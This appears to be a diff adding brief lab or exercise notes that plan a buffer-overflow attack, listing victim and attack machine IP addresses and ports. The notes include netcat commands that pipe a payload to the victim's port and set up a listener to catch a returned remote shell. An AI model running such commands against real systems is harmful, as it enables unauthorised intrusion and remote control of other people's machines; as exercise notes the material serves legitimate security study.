@@ -1,0 +1,7 @@
+	VICTIM		ATTACK		ATTACKER
+IP	10.247.49.156	10.247.49.145	?
+PORT	8888		up to me	?
+
+Attacker sends payload via netcat using IP/Port of Victim
+Payload should overflow buffer, return shell to Attack IP/Port $payload|nc 10.247.49.156 8888
+Attack machine should be listening on this port for shell (nc -lp 0000)
